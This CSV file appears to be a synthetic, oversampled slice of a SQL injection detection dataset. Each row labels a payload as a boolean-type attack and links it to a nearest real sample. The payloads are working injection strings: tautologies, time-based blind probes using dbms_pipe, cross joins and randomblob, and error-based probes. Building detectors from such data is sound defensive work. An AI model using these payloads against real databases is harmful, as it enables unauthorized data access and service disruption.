id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000072,attack,boolean,"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000430,0.5944331453545701
SMOTE_000073,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000629,0.7344126165172157
SMOTE_000074,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000065,0.6368450974599573
SMOTE_000075,attack,boolean,"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",nearest_attack_euclidean,R000158,0.12220246405367913
SMOTE_000076,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000005,0.12593410281773973
SMOTE_000077,attack,boolean,or 1/*,nearest_attack_euclidean,R000030,1.7417745129320352
SMOTE_000078,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000176,0.09580516428457546
SMOTE_000079,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R000418,0.4209889637995772
SMOTE_000080,attack,boolean,"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000558,0.33522103099873585
SMOTE_000081,attack,boolean,"1   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   8867  =  8867",nearest_attack_euclidean,R000576,0.3370571253300082
SMOTE_000082,attack,boolean,"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000608,0.06468719070119272
SMOTE_000083,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000489,0.30320485258709157
SMOTE_000084,attack,boolean,"1   )    )    as krzi where 8727  =  8727 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000616,0.17394280324470957
SMOTE_000085,attack,boolean,"1%""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000442,1.0207875399401
SMOTE_000086,attack,boolean,"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000593,0.4114790580821795
SMOTE_000087,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000494,1.176145502841877
SMOTE_000088,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,1.0132939113348685
SMOTE_000089,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",nearest_attack_euclidean,R000426,0.3703528528668013
SMOTE_000090,attack,boolean,end and    (    (     (  'xzbk'  =  'xzbk,nearest_attack_euclidean,R000668,1.2170950381496104
SMOTE_000091,attack,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'nlnk' like 'nlnk",nearest_attack_euclidean,R000779,1.9902070747364582
SMOTE_000092,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000005,0.5308850194467742
SMOTE_000093,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000347,0.15531519790239384
SMOTE_000094,attack,boolean,-9771' or 5113  =  5365,nearest_attack_euclidean,R000595,0.571104198115503
SMOTE_000095,attack,boolean,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",nearest_attack_euclidean,R000645,0.5273720267178668
SMOTE_000096,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000308,0.2037467544173183
SMOTE_000097,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000246,0.875338618669901
SMOTE_000098,attack,boolean,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.8319778861439827
SMOTE_000099,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000120,1.6388463533530446
SMOTE_000100,attack,boolean,"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",nearest_attack_euclidean,R000169,0.892157079490721
SMOTE_000101,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000079,2.3955039336584654
SMOTE_000102,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R000419,0.50656271178873
SMOTE_000103,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000004,0.08090728623165501
SMOTE_000104,attack,boolean,"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000492,0.29144498579308464
SMOTE_000105,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000712,1.8400356321873605
SMOTE_000106,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000213,2.317299671602952
SMOTE_000107,attack,boolean,"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000189,0.459075820504088
SMOTE_000108,attack,boolean,"-4736'   )    )    or elt  (  5835  =  5509,5509  )   and    (    (   'iawg'  =  'iawg",nearest_attack_euclidean,R000592,0.37759678851089157
SMOTE_000109,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000033,1.4105977670202525
SMOTE_000110,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000228,0.4261387814762162
SMOTE_000111,attack,boolean,"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000711,0.0711622667930114
SMOTE_000112,attack,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'nlnk' like 'nlnk",nearest_attack_euclidean,R000779,0.6736301512535388
SMOTE_000113,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000600,2.248189312241654
SMOTE_000114,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000206,0.06384685893794517
SMOTE_000115,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000150,0.7203167597075801
SMOTE_000116,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000409,1.3672617789057901
SMOTE_000117,attack,boolean,-3677'   )    )    or 1939  =  4484,nearest_attack_euclidean,R000684,0.021300803351666744
SMOTE_000118,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000712,1.2493604197738868
SMOTE_000119,attack,boolean,"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000562,0.9965688784352916
SMOTE_000120,attack,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",nearest_attack_euclidean,R000767,0.28958243009128376
SMOTE_000121,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000029,1.886648462568952
SMOTE_000122,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R000351,0.020359726154527552
SMOTE_000123,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000017,5.603176594260576
SMOTE_000124,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000285,0.5200811201037646
